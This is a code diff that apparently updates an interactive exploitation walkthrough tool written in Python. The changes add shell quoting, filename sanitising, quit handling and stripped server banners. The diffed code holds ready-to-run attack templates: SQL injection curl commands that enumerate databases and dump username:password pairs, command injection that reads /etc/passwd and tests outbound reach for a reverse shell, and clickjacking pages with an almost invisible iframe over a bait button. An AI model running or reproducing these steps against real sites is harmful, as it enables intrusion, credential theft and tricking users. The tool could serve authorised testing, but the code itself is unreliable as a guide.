@@ -71,7 +71,7 @@ if not _VENV_PY.exists() and not _system_has_deps():
     print(f"  [!] Run: bash install.sh")
     sys.exit(1)
 
-import json, subprocess, shutil, secrets, signal, threading, time as _time_mod
+import json, subprocess, shutil, secrets, signal, threading, time as _time_mod, shlex
 from decimal import Decimal, InvalidOperation
 from urllib.parse import urlparse, quote
 
@@ -301,7 +301,9 @@ class ExploitFileManager:
         auto-cleanup and its full path is never printed — only the filename.
         """
         if custom_name:
-            fname = custom_name
+            fname = Path(custom_name).name  # strip any path components
+            if not fname or fname.startswith("."):
+                fname = f"{exploit_type}_{secrets.token_hex(4)}{extension}"
         else:
             tag = secrets.token_hex(4)
             fname = f"{exploit_type}_{tag}{extension}"
@@ -460,8 +462,20 @@ class ExploitServer:
             _started_event = self._started
 
             class _Handler(http.server.BaseHTTPRequestHandler):
+                server_version = ""
+                sys_version = ""
+
+                def version_string(hself):
+                    return ""
+
                 def log_message(hself, fmt, *args):
                     pass
+
+                def send_error(hself, code, message=None, explain=None):
+                    hself.send_response(code)
+                    hself.send_header("Content-Length", "0")
+                    hself.send_header("Connection", "close")
+                    hself.end_headers()
 
                 def do_GET(hself):
                     from urllib.parse import unquote
@@ -1944,7 +1958,7 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
         ei = v.get("exploit_info", {})
         etype = ei.get("type", "unknown")
         param = ei.get("parameter", "")
-        test_url = v.get("test_url", base_url)
+        test_url = v.get("test_url") or base_url
 
         findings_summary.append({
             "severity": sev, "type": etype,
@@ -1971,9 +1985,12 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
         print(f"  {B}Exploitation Steps ({len(steps)}):{N}")
         print()
 
-        _run_steps_smart(steps, etype, test_url, vi, executor, file_mgr,
-                         server, audit, chain_data, attacker_url, preset,
-                         auto_mode)
+        quit_requested = _run_steps_smart(
+            steps, etype, test_url, vi, executor, file_mgr,
+            server, audit, chain_data, attacker_url, preset, auto_mode)
+
+        if quit_requested:
+            break
 
         if len(targets) > 1 and vi < len(targets) - 1:
             print()
@@ -2002,7 +2019,7 @@ def _pre_generate_all_files(exploitable, base_url, sp, attacker_url,
         ei = v.get("exploit_info", {})
         etype = ei.get("type", "unknown")
         param = ei.get("parameter", "")
-        test_url = v.get("test_url", base_url)
+        test_url = v.get("test_url") or base_url
         target = test_url if test_url and test_url != "[TARGET]" else base_url
 
         steps = _build_exploit_steps(etype, param, ei, test_url, base_url, sp)
@@ -2035,8 +2052,9 @@ def _run_steps_smart(steps: list, etype: str, test_url: str,
                      file_mgr: ExploitFileManager,
                      server: ExploitServer, audit: AuditTrail,
                      chain_data: dict, attacker_url: str,
-                     preset: dict, auto_mode: bool):
+                     preset: dict, auto_mode: bool) -> bool:
     """Smart step execution — user controls each step but output chains.
+    Returns True if user requested quit (q).
 
     Each step shows the command + context, then the user picks:
     r=run, e=edit+run, s=skip, n=next finding, d=files, a=audit, q=quit
@@ -2072,8 +2090,8 @@ def _run_steps_smart(steps: list, etype: str, test_url: str,
         # ── File-generation steps: already pre-generated ──
         if step.get("generate_file"):
             finfo = step["generate_file"]
-            fname = finfo.get("filename", "")
-            existing = file_mgr.get_path(fname) if fname else None
+            fname = finfo.get("filename") or f"{etype}_{secrets.token_hex(3)}.html"
+            existing = file_mgr.get_path(fname)
             if existing:
                 serve_url = server.get_url(existing.name)
                 print(f"  {G}[FILE {step_num}/{len(steps)}]{N} {B}{step_title}{N}")
@@ -2147,15 +2165,16 @@ def _run_steps_smart(steps: list, etype: str, test_url: str,
 
             if action in ("q", "quit"):
                 audit.log("session_end", "user_quit")
-                return
+                return True
 
             if action in ("n", "next"):
                 audit.log_skip(f"finding_{vi+1}_remaining_steps", etype)
+                step_idx = len(steps)  # exit outer loop
                 break
 
             if action in ("s", "skip"):
                 info(f"Skipped step {step_num}")
-                audit.log_skip(step["title"], etype)
+                audit.log_skip(step_title, etype)
                 step_idx += 1
                 break
 
@@ -2206,8 +2225,7 @@ def _run_steps_smart(steps: list, etype: str, test_url: str,
                 step_idx += 1
                 break
 
-        if action in ("n", "next"):
-            continue
+    return False
 
 
 def _auto_extract_chain_data(output: str, etype: str, chain_data: dict):
@@ -2356,7 +2374,7 @@ def _walkthrough_session_end(file_mgr: ExploitFileManager,
             print(report_content)
             print()
 
-    _walkthrough_cleanup(file_mgr, audit, executor, server)
+    # Cleanup handled by the outer try/finally in _intel_exploit_walkthrough
 
 
 def _walkthrough_cleanup(file_mgr: ExploitFileManager,
@@ -2395,6 +2413,10 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
     target = test_url if test_url and test_url != "[TARGET]" else base_url
     path = ei.get("path", "")
     target_base = target.split("?")[0] if "?" in target else target
+    # Shell-safe versions for embedding in bash commands
+    _t = shlex.quote(target)
+    _tb = shlex.quote(target_base)
+    _bu = shlex.quote(base_url)
     steps = []
 
     if etype == "sqli":
@@ -2412,54 +2434,54 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         _p_sleep = _q("' AND SLEEP(5)-- -")
         steps = [
             {"title": "Confirm injection (error-based)",
-             "command": f"curl -s {sp} \"{target}\"",
+             "command": f"curl -s {sp} {_t}",
              "note": "Look for SQL error messages in the response body"},
             {"title": "Detect DB engine",
              "command": (
                  f"echo '--- MySQL/Maria ---' && "
-                 f"curl -s {sp} \"{target_base}?{param}={_p_ver}\" && "
+                 f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + _p_ver)} && "
                  f"echo '--- SQLite ---' && "
-                 f"curl -s {sp} \"{target_base}?{param}={_p_sqlite}\""
+                 f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + _p_sqlite)}"
              ),
              "note": "Version string identifies the backend engine"},
             {"title": "Find column count",
              "command": (
                  f"for i in $(seq 1 15); do "
                  f"CODE=$(curl -s -o /dev/null -w '%{{http_code}}' {sp} "
-                 f"\"{target_base}?{param}={_p_orderby}$i{_p_tail}\"); "
+                 f"{shlex.quote(target_base + '?' + param + '=')}$({shlex.quote(_p_orderby)}$i{shlex.quote(_p_tail)}); "
                  f"echo \"ORDER BY $i -> HTTP $CODE\"; done"
              ),
-             "note": "Last 200 response = N columns. First error = N+1."},
+             "note": "Last 200 = N columns. First error = N+1."},
             {"title": "UNION version extraction",
-             "command": f"curl -s {sp} \"{target_base}?{param}={_p_ver}\"",
-             "note": "Confirms UNION injection. Shows DB version."},
+             "command": f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + _p_ver)}",
+             "note": "Confirms UNION. Shows DB version."},
             {"title": "Enumerate databases",
-             "command": f"curl -s {sp} \"{target_base}?{param}={_p_dbs}\"",
-             "warning": "Reads all database names from the server"},
+             "command": f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + _p_dbs)}",
+             "warning": "Reads all database names"},
             {"title": "Enumerate tables",
-             "command": f"curl -s {sp} \"{target_base}?{param}={_p_tbls}\"",
-             "warning": "Lists every table in the current database"},
-            {"title": "Enumerate columns (users table)",
-             "command": f"curl -s {sp} \"{target_base}?{param}={_p_cols}\"",
-             "warning": "Maps the user table structure"},
+             "command": f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + _p_tbls)}",
+             "warning": "Lists every table in current database"},
+            {"title": "Enumerate columns (users)",
+             "command": f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + _p_cols)}",
+             "warning": "Maps user table structure"},
             {"title": "Dump credentials",
-             "command": f"curl -s {sp} \"{target_base}?{param}={_p_dump}\"",
+             "command": f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + _p_dump)}",
              "warning": "Extracts username:password pairs",
              "risk": "HIGH"},
             {"title": "Blind boolean test",
              "command": (
-                 f"TRUE=$(curl -s {sp} \"{target_base}?{param}={_p_true}\" | wc -c) && "
-                 f"FALSE=$(curl -s {sp} \"{target_base}?{param}={_p_false}\" | wc -c) && "
-                 f"echo \"TRUE=$TRUE bytes, FALSE=$FALSE bytes\" && "
-                 f"[ \"$TRUE\" != \"$FALSE\" ] && echo 'BLIND SQLi CONFIRMED' || echo 'Same size'"
+                 f"TRUE=$(curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + _p_true)} | wc -c) && "
+                 f"FALSE=$(curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + _p_false)} | wc -c) && "
+                 f"echo \"TRUE=$TRUE FALSE=$FALSE\" && "
+                 f"[ \"$TRUE\" != \"$FALSE\" ] && echo 'BLIND CONFIRMED' || echo 'Same size'"
              ),
-             "note": "Automated comparison of true/false responses"},
+             "note": "Automated true/false comparison"},
             {"title": "Time-based blind test",
              "command": (
                  f"START=$(date +%s) && "
-                 f"curl -s {sp} \"{target_base}?{param}={_p_sleep}\" > /dev/null && "
+                 f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + _p_sleep)} > /dev/null && "
                  f"END=$(date +%s) && DIFF=$((END-START)) && "
-                 f"echo \"Response took ${{DIFF}}s\" && "
+                 f"echo \"Delay: ${{DIFF}}s\" && "
                  f"[ $DIFF -ge 4 ] && echo 'TIME-BASED CONFIRMED' || echo 'No delay'"
              ),
              "note": "Automated timing comparison"},
@@ -2677,29 +2699,25 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         )
         steps = [
             {"title": "Confirm command execution (id)",
-             "command": f"curl -s {sp} \"{target}\"",
+             "command": f"curl -s {sp} {_t}",
              "note": "Look for uid=, whoami result, or command output"},
             {"title": "Test semicolon separator",
-             "command": f"curl -s {sp} \"{target_base}?{param}=;id\"",
+             "command": f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + quote(';id'))}",
              "note": "Unix command chain via semicolon"},
             {"title": "Test pipe separator",
-             "command": f"curl -s {sp} \"{target_base}?{param}=|id\"",
-             "note": "Pipe operator — output of first command piped"},
+             "command": f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + quote('|id'))}",
+             "note": "Pipe operator"},
             {"title": "Test $() subshell",
-             "command": f"curl -s {sp} \"{target_base}?{param}=$(id)\"",
-             "note": "POSIX subshell execution"},
+             "command": f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + quote('$(id)'))}",
+             "note": "POSIX subshell execution on server"},
             {"title": "Read /etc/passwd",
-             "command": f"curl -s {sp} \"{target_base}?{param}=;cat /etc/passwd\"",
+             "command": f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + quote(';cat /etc/passwd'))}",
              "warning": "Reads system user file"},
             {"title": "Enumerate system info",
-             "command": (
-                 f"curl -s {sp} \"{target_base}?{param}="
-                 f";echo '===UNAME===' && uname -a && echo '===WHOAMI===' && whoami"
-                 f" && echo '===PWD===' && pwd\""
-             ),
+             "command": f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + quote(';uname -a;whoami;pwd'))}",
              "note": "Gathers OS, user, and directory info"},
             {"title": "Check for outbound connectivity",
-             "command": f"curl -s {sp} \"{target_base}?{param}=;curl -s https://ifconfig.me\"",
+             "command": f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + quote(';curl -s https://ifconfig.me'))}",
              "note": "If output = IP, the server can make outbound requests (reverse shell possible)"},
             {"title": "Reverse shell setup (example — COMMENTED)",
              "command": (
@@ -2944,9 +2962,9 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             f"*{{margin:0;padding:0;box-sizing:border-box}}"
             f"body{{font-family:-apple-system,sans-serif;background:#f0f2f5}}"
             f"iframe{{position:fixed;top:0;left:0;width:100%;height:100%;"
-            f"opacity:0.0001;z-index:100;border:none}}"
+            f"opacity:0.0001;z-index:2;border:none;pointer-events:auto}}"
             f".bait{{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;"
-            f"display:flex;justify-content:center;align-items:center}}"
+            f"display:flex;justify-content:center;align-items:center;pointer-events:none}}"
             f".card{{background:#fff;padding:40px 50px;border-radius:12px;"
             f"box-shadow:0 4px 20px rgba(0,0,0,.1);text-align:center;max-width:440px}}"
             f"button{{padding:14px 40px;background:#1877f2;color:#fff;border:none;"
@@ -2969,7 +2987,7 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             f"*{{margin:0;padding:0;box-sizing:border-box}}"
             f"body{{font-family:-apple-system,sans-serif;background:#f0f2f5}}"
             f"iframe{{position:fixed;top:0;left:0;width:100%;height:100%;"
-            f"opacity:0.0001;z-index:100;border:none}}"
+            f"opacity:0.0001;z-index:2;border:none;pointer-events:auto}}"
             f".banner{{position:fixed;bottom:0;left:0;width:100%;background:#fff;"
             f"padding:20px 30px;box-shadow:0 -2px 10px rgba(0,0,0,.1);z-index:1;"
             f"display:flex;align-items:center;justify-content:space-between}}"
